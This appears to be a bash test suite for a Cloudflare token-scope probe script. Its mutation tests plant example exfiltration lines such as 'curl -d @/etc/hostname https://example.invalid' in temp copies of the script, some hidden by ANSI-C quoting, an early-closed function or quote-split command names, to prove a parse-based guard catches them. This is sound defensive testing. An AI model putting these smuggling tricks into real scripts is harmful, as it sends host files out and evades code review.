resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -X "$method" -H 'Content-Type: application/json' --data-binary "$w_body" -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
CANON
# d12c_check <script> <I|S> [bash]: prints nothing when the curl-naming lines of
# bash's parse of <script> equal D12C_CANON as a multiset (S: both sides with every
# ' " \ deleted). A non-zero --pretty-print exit prints "PARSE rc=<n>: <stderr>".
d12c_check() {
  local o="$WORK/d12c-chk.$RANDOM" rc=0
  env -i PATH=/var/empty "${3:-$BASHBIN}" --pretty-print "$1" >"$o.pp" 2>"$o.err" || rc=$?
  if [[ "$rc" != 0 ]]; then printf 'PARSE rc=%s: %s\n' "$rc" "$(head -c 300 "$o.err")"; return; fi
  if [[ "$2" == S ]]; then
    tr -d "'\"\\\\" <"$o.pp" >"$o.x"; tr -d "'\"\\\\" <"$D12C_CANON" >"$o.c"
  else
    cp "$o.pp" "$o.x"; cp "$D12C_CANON" "$o.c"
  fi
  awk '{ sub(/^[ \t]+/, ""); sub(/[ \t]+$/, "") } tolower($0) ~ /curl/' "$o.x" | LC_ALL=C sort >"$o.s"
  LC_ALL=C sort "$o.c" >"$o.cs"
  diff "$o.cs" "$o.s" >"$o.d" || cat "$o.d"
}

# shellcheck disable=SC2016  # the child bash expands these, not this one
if "$BASHBIN" -c '(( BASH_VERSINFO[0] > 5 || (BASH_VERSINFO[0] == 5 && BASH_VERSINFO[1] >= 2) ))'; then
  ok "D12c (P) $BASHBIN is bash >= 5.2 ($("$BASHBIN" -c 'printf %s "$BASH_VERSION"')), the --pretty-print this block reads through"
else
  no "D12c (P) $BASHBIN is older than bash 5.2: --pretty-print is unavailable or prints a different parse (RED, never a skip)"
fi
d12c_out="$(d12c_check "$SUT" I)"
if [[ -z "$d12c_out" ]]; then ok "D12c (P+I) bash parses the script, and every curl-naming line of the parse is a reviewed canonical form"; else no "D12c (P+I) parse failed or curl lines differ from D12C_CANON: $d12c_out"; fi
d12c_out="$(d12c_check "$SUT" S)"
if [[ -z "$d12c_out" ]]; then ok "D12c (S) the same holds with every ' \" \\ deleted (no quote-split curl name)"; else no "D12c (S) quote-stripped curl lines differ from D12C_CANON: $d12c_out"; fi
d12c_fl_canon="$(awk -f "$D12C_FLAGS" "$D12C_CANON")"
if [[ -z "$d12c_fl_canon" ]]; then ok "D12c (F) the canonical forms pass the flag allowlist"; else no "D12c (F) a canonical form breaks the allowlist: $d12c_fl_canon"; fi
# shellcheck disable=SC2016  # literal source text is the assertion
assert_eq "D12c the run path sends the write body from exactly one curl site" 1 "$(grep -cF -- "$D12C_WRITE_ANCHOR" "$SUT" || true)"
# The w_body WRITE forms over bash's parse: exactly the local declaration with no
# initializer and the two closed-case assignments. A plain ^w_body= count would
# miss `local w_body=…`, `read … w_body`, `printf -v w_body`, `w_body+=`, and an
# assignment after another command on the same line (`[[ … ]] && w_body=…`,
# `export w_body=…`, `x=1 w_body=…`, `: "${w_body:=…}"`). Only the dry-run's
# `printf '%s\n' "…"` recipe strings are blanked first: they print text, they assign nothing.
wbody_set() {
  env -i PATH=/var/empty "$BASHBIN" --pretty-print "$1" 2>/dev/null \
    | awk '{ sub(/^[ \t]+/, ""); sub(/[ \t]+$/, "") }
           { gsub(/printf \047%s\\n\047 "([^"\\]|\\.)*"/, "printf_recipe") }
           /local[^;]*[^A-Za-z0-9_]w_body([^A-Za-z0-9_]|$)|(^|[^A-Za-z0-9_$])w_body(\+?=|:=)|read[^;]*[^A-Za-z0-9_]w_body([^A-Za-z0-9_]|$)|printf[^;]*-v[ \t]*w_body|declare[^;]*[^A-Za-z0-9_]w_body([^A-Za-z0-9_]|$)/' \
    | LC_ALL=C sort
}
WBODY_WANT="$WORK/wbody-want.txt"
# shellcheck disable=SC2016  # literal source text is the assertion
printf '%s\n' 'local w_body;' 'w_body="$INVALID_BODY"' 'w_body="$SETTINGS_PROBE_BODY"' | LC_ALL=C sort >"$WBODY_WANT"
if diff "$WBODY_WANT" <(wbody_set "$SUT") >/dev/null; then
  ok "D12c w_body is written only by its bare local declaration and the two closed-case literal assignments"
else
  no "D12c w_body write forms differ from the reviewed three: $(wbody_set "$SUT" | tr '\n' '|')"
fi

# Mutants of the SCRIPT, each applied to a temp COPY (never the live tree) and
# never executed. Each row asserts the layer that must red it, for its own reason:
# I = the parse succeeds and its curl lines differ from the canon; S = the same on
# the stripped copy; P = --pretty-print exits non-zero.
D12C_GET_ANCHOR="-sS --max-time 15 -w '\n%{http_code}' \\"
D12C_FN_ANCHOR=$'    *)             printf \'\' ;;\n  esac\n'
# d12c_mut <layer I|S|P> <label> <anchor> <replacement> | <layer> <label> APPEND <line>
d12c_mut() {
  local layer="$1" label="$2" anchor="$3" repl="$4" src copy="$WORK/d12c-mut.sh" out
  src="$(cat "$SUT")"
  if [[ "$anchor" == APPEND ]]; then src+=$'\n'"$repl"; else
    [[ "$src" == *"$anchor"* ]] || { no "MUT D12c $label: anchor not found in source (mutant is vacuous)"; return; }
    src="${src/"$anchor"/"$repl"}"
  fi
  printf '%s\n' "$src" >"$copy"
  case "$layer" in
    P) out="$(d12c_check "$copy" I)"
       if [[ "$out" == "PARSE rc="* ]]; then ok "MUT D12c $label reds the parse (P)"; else no "MUT D12c $label survives the parse (P): [$out]"; fi ;;
    *) out="$(d12c_check "$copy" "$layer")"
       if [[ -n "$out" && "$out" != "PARSE rc="* ]]; then ok "MUT D12c $label reds ($layer)"; else no "MUT D12c $label survives ($layer), or reds for another reason: [$out]"; fi ;;
  esac
}
# shellcheck disable=SC2016  # literal source text is the mutation
{
d12c_mut I '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
d12c_mut I '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
d12c_mut I 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
d12c_mut I 'curl site back to --data-binary "$INVALID_BODY" (Guard 1 #8)' "$D12C_WRITE_ANCHOR" '--data-binary "$INVALID_BODY"'
d12c_mut I '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
d12c_mut I '-XDELETE on a read probe (no body)' "$D12C_GET_ANCHOR" "-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"
d12c_mut I 'a new curl line hiding behind "# INVALID_BODY"' APPEND 'curl -sS -d @/etc/hostname https://example.invalid # INVALID_BODY'
# The payload that beat revision 4 (test-design seat, fr3 F1): bash leaves the
# ANSI-C string after `$'\''`, so the '# ' line is live code and runs the curl.
d12c_mut I 'ANSI-C quoting: curl on a "#" line that bash runs' APPEND $'x=$\'\\\'\'\ny=\'\n# \'; curl --disable -sS -d @/etc/hostname https://example.invalid'
d12c_mut I 'a continuation-split -XDE\<newline>LETE on a read probe' "$D12C_GET_ANCHOR" $'-sS -XDE\\\nLETE --max-time 15 -w \'\\n%{http_code}\' \\'
d12c_mut I '"}"-escape: a function body closed early, a top-level curl, a new function' "$D12C_FN_ANCHOR" "$D12C_FN_ANCHOR"$'}\n/usr/bin/curl -sS -d @/etc/hostname https://example.invalid\n__w() { :\n'
# Names split by quotes or a backslash: bash prints the word as written, so only (S) sees them.
d12c_mut S 'split name cu""rl' APPEND 'cu""rl -sS -d @/etc/hostname https://example.invalid'
d12c_mut S 'split name cur\l' APPEND 'cur\l -sS -d @/etc/hostname https://example.invalid'
# A parse error after the last canonical line: bash has already printed every
# canonical line, so only the exit code tells the parse stopped.
d12c_mut P 'a stray "}" / curl / "__w() { :" at top level (syntax error)' APPEND $'}\n/usr/bin/curl -sS -d @/etc/hostname https://example.invalid\n__w() { :'
}
# (P) a bash without --pretty-print (a 5.1-or-older stand-in that rejects the option) is RED.
printf '%s\n' '#!/bin/sh' 'echo "bash: --pretty-print: invalid option" >&2; exit 2' >"$WORK/bash-no-pp"
chmod +x "$WORK/bash-no-pp"
d12c_out="$(d12c_check "$SUT" I "$WORK/bash-no-pp")"
if [[ "$d12c_out" == "PARSE rc=2: "* ]]; then ok "MUT D12c (P) a bash that rejects --pretty-print reds, never skips"; else no "MUT D12c (P) a bash without --pretty-print was not RED: [$d12c_out]"; fi
# Mutants of D12C_CANON for the (F) lint: a "reviewed" canon refresh that admits a
# write flag must red (F). Applied to a temp copy of the canon.
# d12c_fmut <label> <anchor> <replacement> | <label> APPEND <line>
d12c_fmut() {
  local label="$1" anchor="$2" repl="$3" src copy="$WORK/d12c-canon-mut.txt"
  src="$(cat "$D12C_CANON")"
  if [[ "$anchor" == APPEND ]]; then src+=$'\n'"$repl"; else
    [[ "$src" == *"$anchor"* ]] || { no "MUT D12c (F) $label: anchor not found in D12C_CANON (mutant is vacuous)"; return; }
    src="${src/"$anchor"/"$repl"}"
  fi
  printf '%s\n' "$src" >"$copy"
  if [[ -n "$(awk -f "$D12C_FLAGS" "$copy")" ]]; then ok "MUT D12c (F) canon admitting $label reds the flag lint"; else no "MUT D12c (F) canon admitting $label survives the flag lint"; fi
}
# shellcheck disable=SC2016  # literal canon text is the mutation
{
d12c_fmut '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
d12c_fmut 'a new curl line with -d @/etc/hostname' APPEND 'curl -sS -d @/etc/hostname https://example.invalid'
d12c_fmut 'the body word back to "$INVALID_BODY" (Guard 1 #8)' "$D12C_WRITE_ANCHOR" '--data-binary "$INVALID_BODY"'
}
# Guard 1 #7: a third w_body assignment reds the write-form set (temp copy, never run).
# shellcheck disable=SC2016  # literal source text is the assertion
printf '%s\n%s\n' "$(cat "$SUT")" 'w_body="$X"' >"$WORK/wbody-mut.sh"
if diff "$WBODY_WANT" <(wbody_set "$WORK/wbody-mut.sh") >/dev/null; then no "MUT D12c a third w_body= assignment survives the write-form set"; else ok "MUT D12c a third w_body= assignment reds the write-form set"; fi
# shellcheck disable=SC2016  # literal source text is the assertion
printf '%s\n%s\n' "$(cat "$SUT")" 'f() { local w_body="$X"; }' >"$WORK/wbody-mut.sh"
if diff "$WBODY_WANT" <(wbody_set "$WORK/wbody-mut.sh") >/dev/null; then no "MUT D12c a local w_body=… initializer survives the write-form set"; else ok "MUT D12c a local w_body=… initializer reds the write-form set"; fi
# Write forms that sit after another command on the same line, or behind printf -v.
# shellcheck disable=SC2016  # literal source text is the assertion
for wb_form in 'f() { printf -v w_body "%s" "$X"; }' 'f() { [[ -z "$X" ]] || w_body="$X"; }' 'f() { export w_body="$X"; }' 'f() { x=1 w_body="$X" true; }' 'f() { : "${w_body:=$X}"; }'; do
  printf '%s\n%s\n' "$(cat "$SUT")" "$wb_form" >"$WORK/wbody-mut.sh"
  if diff "$WBODY_WANT" <(wbody_set "$WORK/wbody-mut.sh") >/dev/null; then no "MUT D12c write form <$wb_form> survives the write-form set"; else ok "MUT D12c write form <$wb_form> reds the write-form set"; fi
done
# Negative control: reads of w_body are not write forms.
# shellcheck disable=SC2016  # literal source text is the assertion
printf '%s\n%s\n' "$(cat "$SUT")" 'f() { printf "%s" "$w_body" "${w_body:-}" "${#w_body}"; }' >"$WORK/wbody-mut.sh"
if diff "$WBODY_WANT" <(wbody_set "$WORK/wbody-mut.sh") >/dev/null; then ok "D12c reads of w_body leave the write-form set unchanged (negative control)"; else no "D12c a read of w_body was counted as a write form: $(wbody_set "$WORK/wbody-mut.sh" | tr '\n' '|')"; fi
# Negative controls: a non-curl line that tripped the old spelling list (grep -qF,
# sort -T, [[ -d) and a whole-line comment naming curl (bash drops it) stay green.
printf '%s\n%s\n' "$(cat "$SUT")" '[[ -d /tmp ]] && sort -T /tmp </dev/null >/dev/null; grep -qF -- x /dev/null || true' >"$WORK/d12c-mut.sh"
if [[ -z "$(d12c_check "$WORK/d12c-mut.sh" I)$(d12c_check "$WORK/d12c-mut.sh" S)" ]]; then
  ok "D12c negative control: non-curl -d/-T/-F lines do not false-match (I, S)"
else
  no "D12c a non-curl line false-matched the allowlist"
fi
printf '%s\n%s\n' "$(cat "$SUT")" '  # a comment that names curl -d @/etc/hostname' >"$WORK/d12c-mut.sh"
if [[ -z "$(d12c_check "$WORK/d12c-mut.sh" I)$(d12c_check "$WORK/d12c-mut.sh" S)" ]]; then
  ok "D12c negative control: a whole-line comment naming curl stays green (bash's parse drops it)"
else
  no "D12c a comment naming curl false-matched (I/S)"
fi
# (U) the mock refuses an unmodelled flag rather than answering it as a GET.
D12C_ULOG="$WORK/d12c-unmodelled.log"; : >"$D12C_ULOG"
PATH="$MOCKPATH" MOCK_CURL_UNMODELLED="$D12C_ULOG" "$MOCKBIN/curl" -sS -XDELETE https://api.cloudflare.com/client/v4/x >"$OUTFILE" 2>&1
d12c_urc=$?
if [[ "$d12c_urc" == 64 ]] && grep -qF -- 'UNMODELLED -XDELETE' "$D12C_ULOG" && [[ ! -s "$OUTFILE" ]]; then
  ok "D12c (U) positive control: the mock refuses -XDELETE (exit 64, logged, no response body)"
else
  no "D12c (U) the mock answered an unmodelled flag (rc=$d12c_urc)"
fi
# End to end: the -XDELETE read-probe mutant, RUN through the mock, lands in the log.
src="$(cat "$SUT")"; printf '%s\n' "${src/"$D12C_GET_ANCHOR"/"-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"}" >"$WORK/d12c-mut-run.sh"
: >"$D12C_ULOG"
PATH="$MOCKPATH" MOCK_CURL_UNMODELLED="$D12C_ULOG" "$BASHBIN" "$WORK/d12c-mut-run.sh" >"$OUTFILE" 2>&1
d12c_urc=$?
if grep -qF -- 'UNMODELLED -XDELETE' "$D12C_ULOG" && [[ "$d12c_urc" != 0 ]]; then
  ok "MUT D12c the -XDELETE read-probe mutant, run through the mock, is logged UNMODELLED and fails"
else
  no "MUT D12c the -XDELETE mutant ran through the mock unseen (rc=$d12c_urc)"
fi
unset src d12c_urc
src_lacks 'doppler[[:space:]]+(secrets[[:space:]]+)?(set|upload|download|delete|push|create)\b' "D12b no Doppler write verb in source"
# Table-integrity tripwire lives in the SUT (fix-round seats: CI pins D-pc/D3
# cover profile/table drift; the CLASS-column guard has no argv-reachable twin
# and must stay a runtime refusal — pin its presence so it cannot be deleted
# silently).
src_has 'is neither retained nor target' "D12d class-validation tripwire present in source (no argv-reachable twin)"

# ============================================================================
# M-series — migration profiles redirects-dns / zone-rest (#12931, CTO L49):
# fixed-body write probes, deny-control-first, 2xx is fatal with a read-back.
NEW_ACCT="66d4f93f7397f196544e9fe84c3557c2"
NEW_ZONE="951ce525552201ec6c696b24251abed7"
MWLOG="$WORK/m-writes.log"
MGLOG="$WORK/m-gets.log"
mrun() { : >"$MWLOG"; : >"$MGLOG"; MOCK_WRITE_LOG="$MWLOG" MOCK_GET_LOG="$MGLOG" run "$MOCKPATH" "$@"; }
# mrun_out: mrun with stdout and stderr captured apart, for rows that pin a channel.
mrun_out() { : >"$MWLOG"; : >"$MGLOG"; MOCK_WRITE_LOG="$MWLOG" MOCK_GET_LOG="$MGLOG" run_out "$MOCKPATH" "$@"; }
# run_script <script> <PATH> <args…>: run() for a temp copy (run() hardcodes $SUT).
run_script() { local script="$1" path="$2"; shift 2; PATH="$path" "$BASHBIN" "$script" "$@" >"$OUTFILE" 2>&1; RC=$?; }
MUT_DLOG="$WORK/mut-doppler.log"
MUT_ARGS=(--profile zone-rest)
MUT_N=0
# run_mut <label> <want-exit> <want-writes> <want-doppler-reads> <want-message> <anchor> <replacement> [<anchor> <replacement>…]
# Applies each pair to a temp COPY of the script (never the live tree), refusing a
# vacuous mutant (an anchor that is not a whole line of the source, or a
# replacement that does not occur exactly once in the copy) and a copy that does
# not parse (bash exits 2 on a syntax error, which would satisfy every exit-2 row
# with zero writes). Then RUNS the copy through the mock with "${MUT_ARGS[@]}" and
# fresh write/GET/Doppler logs. Always emits exactly 5 assertions.
run_mut() {
  local label="$1" want_rc="$2" want_w="$3" want_d="$4" want_msg="$5" src copy anchor repl rest bad=""
  shift 5
  MUT_N=$((MUT_N + 1)); copy="$WORK/run-mut-$MUT_N.sh"
  src="$(cat "$SUT")"
  while [[ $# -ge 2 ]]; do
    anchor="$1"; repl="$2"; shift 2
    if [[ $'\n'"$src"$'\n' != *$'\n'"$anchor"$'\n'* ]]; then bad+=" anchor-not-a-source-line<${anchor:0:70}>"; continue; fi
    src="${src/"$anchor"/"$repl"}"
    if [[ -n "$repl" ]]; then
      rest="${src#*"$repl"}"
      [[ "$src" == *"$repl"* && "$rest" != *"$repl"* ]] || bad+=" replacement-not-exactly-once<${repl:0:70}>"
    fi
  done
  printf '%s\n' "$src" >"$copy"
  "$BASHBIN" -n "$copy" 2>/dev/null || bad+=" copy-does-not-parse"
  : >"$MWLOG"; : >"$MGLOG"; : >"$MUT_DLOG"
  MOCK_WRITE_LOG="$MWLOG" MOCK_GET_LOG="$MGLOG" MOCK_DOPPLER_MARKER="$MUT_DLOG" run_script "$copy" "$MOCKPATH" "${MUT_ARGS[@]}"
  if [[ -z "$bad" ]]; then ok "MUT $label: mutant applied (whole-line anchors, parses)"; else no "MUT $label: vacuous or broken mutant:$bad"; fi
  assert_rc "$want_rc" "MUT $label: exit"
  assert_eq "MUT $label: write requests" "$want_w" "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
  assert_eq "MUT $label: Doppler reads" "$want_d" "$(wc -l <"$MUT_DLOG" | tr -d '[:space:]')"
  has "$want_msg" "MUT $label: message"
}

# --- M0: the body literal itself (L49): present, not JSON, never the wipe body ---
if [[ -n "$INV_BODY" ]]; then ok "M0 INVALID_BODY literal parsed from source (positive control)"; else no "M0 INVALID_BODY literal not found"; fi
if printf '%s' "$INV_BODY" | "$JQBIN" -e . >/dev/null 2>&1; then no "M0 INVALID_BODY parses as JSON — it could validate"; else ok "M0 INVALID_BODY is not JSON, so no endpoint can validate it"; fi
src_lacks '"rules"[[:space:]]*:[[:space:]]*\[[[:space:]]*\]' 'M0 no {"rules":[]} body anywhere in source (it would wipe a live entrypoint)'
src_has 'INVALID_BODY parses as JSON' "M0 runtime JSON tripwire present in source"

# --- M0s / M0h: the settings probe literal (L49 rule 1, Guard 2) ---
if [[ -n "$SET_BODY" ]]; then ok "M0s SETTINGS_PROBE_BODY literal parsed from source (positive control)"; else no "M0s SETTINGS_PROBE_BODY literal not found"; fi
if printf '%s' "$SET_BODY" | "$JQBIN" -e 'type == "object"' >/dev/null 2>&1; then ok "M0s SETTINGS_PROBE_BODY parses as a JSON object"; else no "M0s SETTINGS_PROBE_BODY does not parse as a JSON object"; fi
if printf '%s' "$SET_BODY" | "$JQBIN" -e '(.items | type == "array" and length > 0) and all(.items[]; .id | type == "string" and startswith("cf_token_scope_probe_"))' >/dev/null 2>&1; then
  ok "M0s every .items[].id starts with cf_token_scope_probe_"
else
  no "M0s an item id is not probe-prefixed, or items is empty"
fi
if printf '%s' "$SET_BODY" | "$JQBIN" -e '[.. | objects | has("rules")] | any' >/dev/null 2>&1; then no "M0s SETTINGS_PROBE_BODY carries a rules key"; else ok "M0s SETTINGS_PROBE_BODY carries no rules key"; fi
assert_eq "M0h SETTINGS_PROBE_BODY equals the suite's hardcoded WANT_SET_BODY byte-for-byte" "$WANT_SET_BODY" "$SET_BODY"
assert_eq "M0h the literal is declared exactly once" 1 "$(grep -cxF -- "readonly SETTINGS_PROBE_BODY='$WANT_SET_BODY'" "$SUT" || true)"

# --- D-rows: every write row has 6 fields; exactly one settings-json row (AC2) ---
MROWS="$WORK/m-rows.txt"
awk '/^MIG_WRITE_(REDIRECTS_DNS|ZONE_REST)=\(/ {f=1; next} f && /^\)/ {f=0} f && /^[[:space:]]*"/ { sub(/^[[:space:]]*"/, ""); sub(/"[[:space:]]*$/, ""); print }' "$SUT" >"$MROWS"
assert_eq "D-rows both write tables parsed" "$((MW_RD_N + MW_ZR_N))" "$(wc -l <"$MROWS" | tr -d '[:space:]')"
assert_eq "D-rows every write row has exactly 6 |-separated fields" 0 "$(awk -F'|' 'NF != 6' "$MROWS" | wc -l | tr -d '[:space:]')"
assert_eq "D-rows exactly one row's body-kind is settings-json" 1 "$(awk -F'|' '$6 == "settings-json"' "$MROWS" | wc -l | tr -d '[:space:]')"
# shellcheck disable=SC2016  # the literal row text is the assertion
assert_eq "D-rows the settings-json row is PATCH on the zone settings URL" 1 "$(U='$API/zones/\$ZONE/settings' awk -F'|' '$6 == "settings-json" && $2 == "PATCH" && $3 == ENVIRON["U"]' "$MROWS" | wc -l | tr -d '[:space:]')"
assert_eq "D-rows every other row's body-kind is invalid" 0 "$(awk -F'|' '$6 != "settings-json" && $6 != "invalid"' "$MROWS" | wc -l | tr -d '[:space:]')"

# --- M1: redirects-dns happy path ---
mrun --profile redirects-dns
assert_rc 0 "M1 redirects-dns all authorized -> exit 0"
has "probe=redirects-dns verdict=pass" "M1 prints the pass verdict line"
assert_eq "M1 two write probes (deny + grant) per write row" "$((2 * MW_RD_N))" "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
if awk -v b="$INV_BODY" '{ body=$0; sub(/^[^ ]+ [^ ]+ [^ ]+ /, "", body); if (body != b) bad++ } END { exit bad > 0 }' "$MWLOG"; then
  ok "M1 every write probe carried exactly the INVALID_BODY literal"
else
  no "M1 a write probe carried a different body (see $MWLOG)"
fi
if ! awk '$1 != "PUT" && $1 != "POST" && $1 != "PATCH" {bad++} END {exit bad > 0}' "$MWLOG"; then no "M1 a write probe used a method outside PUT/POST/PATCH"; else ok "M1 write methods are PUT/POST/PATCH only"; fi
if awk -v a="$NEW_ACCT" -v z="$NEW_ZONE" 'index($2, "/zones/" z "/") == 0 && index($2, "/accounts/" a "/") == 0 {bad++} END {exit bad > 0}' "$MWLOG"; then
  ok "M1 every write probe targets the NEW account or zone"
else
  no "M1 a write probe targeted another account/zone"
fi
# Deny-first per URL: the first write to each URL is NOT from the URL's grant token.
if awk '!seen[$2]++ { if (($2 ~ /rulesets\/phases\/|rules\/lists$/ && $3 == "fake-secret-abc123xyz") || ($2 ~ /dns_records$/ && $3 == "default-token-xyz789") || ($2 ~ /pages\/projects$/ && $3 == "tok-pages-mock")) bad++ } END {exit bad > 0}' "$MWLOG"; then
  ok "M1 every URL is probed with the known-denied token before the grant token"
else
  no "M1 a grant token was probed before its deny control (see $MWLOG)"
fi
for ph in http_request_dynamic_redirect http_response_headers_transform http_config_settings http_request_cache_settings http_request_firewall_custom http_request_redirect; do
  has_re "audit: $ph +entrypoint-absent" "M1 whole-list audit reports $ph absent"
done
for leak in fake-secret-abc123xyz default-token-xyz789 tok-pages-mock; do lacks "$leak" "M1 output never carries token $leak"; done

# --- M2: zone-rest happy path ---
mrun --profile zone-rest
assert_rc 0 "M2 zone-rest all authorized -> exit 0"
has "probe=zone-rest verdict=pass" "M2 prints the pass verdict line"
assert_eq "M2 two write probes per zone-rest row" "$((2 * MW_ZR_N))" "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
if grep -qE '^PATCH .*/zones/'"$NEW_ZONE"'/settings ' "$MWLOG" && grep -qE '^PUT .*/zones/'"$NEW_ZONE"'/bot_management ' "$MWLOG"; then
  ok "M2 probes zone settings (PATCH) and bot management (PUT)"
else
  no "M2 zone-rest rows missing (see $MWLOG)"
fi
# Per-row bodies, counted (an empty or body-less log fails): the settings row
# carries exactly SETTINGS_PROBE_BODY, the bot_management row exactly INVALID_BODY.
m_body_n() { awk -v m="$1" -v u="$2" -v b="$3" '$1 == m && $2 ~ u { body = $0; sub(/^[^ ]+ [^ ]+ [^ ]+ /, "", body); if (body == b) c++ } END { print c + 0 }' "$MWLOG"; }
assert_eq "M2 exactly 2 /settings PATCH probes carry SETTINGS_PROBE_BODY" 2 "$(m_body_n PATCH '/settings$' "$SET_BODY")"
assert_eq "M2 exactly 2 /bot_management PUT probes carry INVALID_BODY" 2 "$(m_body_n PUT '/bot_management$' "$INV_BODY")"
# m_body_n can say no: on a log of one right body, one wrong body, one wrong
# method and one wrong URL it counts exactly the one (it must reject the other three).
cp "$MWLOG" "$WORK/m-body-save.log"
printf '%s\n' "PATCH https://x/zones/z/settings t $SET_BODY" "PATCH https://x/zones/z/settings t $INV_BODY" "PUT https://x/zones/z/settings t $SET_BODY" "PATCH https://x/zones/z/bot_management t $SET_BODY" >"$MWLOG"
assert_eq "M2 m_body_n control: counts the matching body and rejects a wrong body, method and URL" 1 "$(m_body_n PATCH '/settings$' "$SET_BODY")"
cp "$WORK/m-body-save.log" "$MWLOG"
if [[ -s "$MWLOG" ]] && awk '!seen[$2]++ { if (($2 ~ /\/settings$/ && $3 != "tok-botmgmt-mock") || ($2 ~ /\/bot_management$/ && $3 != "tok-zonesettings-mock")) bad++ } END { exit bad > 0 }' "$MWLOG"; then
  ok "M2 both rows probe the known-denied token first"
else
  no "M2 a grant token was probed before its deny control (see $MWLOG)"
fi
assert_eq "M2 the settings deny control sent the JSON probe body with the bot-management token" 1 "$(grep -cxF -- "PATCH https://api.cloudflare.com/client/v4/zones/$NEW_ZONE/settings tok-botmgmt-mock $SET_BODY" "$MWLOG" || true)"
M2_SET_LINE='probe=zone-rest row zones/<zone>/settings -> authorized (PATCH 400, err 1006 after a 403 control)'
M2_BOT_LINE='probe=zone-rest row zones/<zone>/bot_management -> authorized (PUT 400, err 10400 after a 403 control)'
assert_eq "M2 the settings row reads authorized with its live code (1006, measured 2026-11-26)" 1 "$(count_f "$M2_SET_LINE")"
assert_eq "M2 the bot_management row reads authorized with its live code (10400, measured 2026-11-26)" 1 "$(count_f "$M2_BOT_LINE")"
for leak in tok-zonesettings-mock tok-botmgmt-mock; do lacks "$leak" "M2 output never carries token $leak"; done

# --- M3: a grant token answering 403 -> verdict=denied, exit 3 ---
MOV="$WORK/m-override.txt"
printf '%s\n' '/dns_records$|default-token-xyz789|403:{"success":false,"errors":[{"code":10000}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 3 "M3 DNS write denied -> exit 3"
has "probe=redirects-dns verdict=denied" "M3 prints verdict=denied"
has_re 'zones/<zone>/dns_records +denied \(403, err 10000; re-mint CF_API_TOKEN\)' "M3 names the denied row and the grant key to re-mint"
lacks "verdict=pass" "M3 no pass verdict"

# --- M4: the deny control answering 400 -> inconclusive; the grant is NOT probed ---
printf '%s\n' '/http_config_settings/entrypoint$|tok-pages-mock|400:{"success":false,"errors":[{"code":10026}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 3 "M4 deny control got 400 -> exit 3"
has "probe=redirects-dns verdict=inconclusive" "M4 prints verdict=inconclusive"
has "a 400 cannot prove scope here" "M4 explains why the 400 is not authorization"
assert_eq "M4 the grant token is never probed when the 403 control failed" 0 "$(grep -cE 'http_config_settings/entrypoint fake-secret-abc123xyz ' "$MWLOG" || true)"

# --- M5: a 2xx on the grant probe -> fatal abort (exit 4) + read-back GET ---
printf '%s\n' '/http_request_dynamic_redirect/entrypoint$|fake-secret-abc123xyz|200:{"success":true,"result":{"id":"x"}}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 4 "M5 a 2xx to the invalid body -> exit 4"
has "probe=redirects-dns verdict=fatal-mutation" "M5 prints verdict=fatal-mutation"
has "a mutation may have landed" "M5 says a mutation may have landed"
if grep -qE "^GET .*/zones/$NEW_ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint fake-secret-abc123xyz$" "$MGLOG"; then
  ok "M5 the entrypoint was read back with the grant token"
else
  no "M5 no read-back GET of the entrypoint (see $MGLOG)"
fi
has_re 'read-back .*-> 200 \{"success":true,"result":\{"id":"r"' "M5 prints the read-back summary"
assert_eq "M5 the run aborted: no write after the 2xx" 2 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
lacks "verdict=pass" "M5 no pass verdict"

# --- M5b: a 2xx on the DENY control is fatal too ---
printf '%s\n' '/pages/projects$|fake-secret-abc123xyz|201:{"success":true,"result":{"id":"x"}}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 4 "M5b a 2xx from the deny-control token -> exit 4"
has "verdict=fatal-mutation" "M5b prints verdict=fatal-mutation"
has "write probe sent with CF_API_TOKEN_RULESETS" "M5b names the DENY token (the pages row's deny control) that answered 2xx, by its Doppler key"
has_re '^probe=redirects-dns write-response accounts/<acct>/pages/projects -> 201 [{]' "M5b prints the deny leg's write response with its own status code"

# --- M5c: the read-back summary never echoes a non-scalar-safe string ---
printf '%s\n' '/bot_management$|tok-botmgmt-mock|200:{"success":true}' >"$MOV"
MOCK_OTHER='200:{"success":true,"result":{"id":"PASS: no scope dropped","version":"1"}}' MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 4 "M5c bot-management 2xx -> exit 4"
lacks "PASS: no scope dropped" "M5c read-back redacts a verdict-looking string"
has '"id":"<redacted>"' "M5c read-back shows the redaction marker"
unset MOCK_OTHER

# --- M5d: a 2xx on the settings grant probe -> exit 4 after a read-back (CTO dissent trigger) ---
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|200:{"success":true,"result":[]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 4 "M5d settings grant 2xx -> exit 4"
has "probe=zone-rest verdict=fatal-mutation" "M5d prints verdict=fatal-mutation"
assert_eq "M5d the settings list was read with the grant token twice (control, then read-back)" 2 "$(grep -cxF -- "GET https://api.cloudflare.com/client/v4/zones/$NEW_ZONE/settings tok-zonesettings-mock" "$MGLOG" || true)"
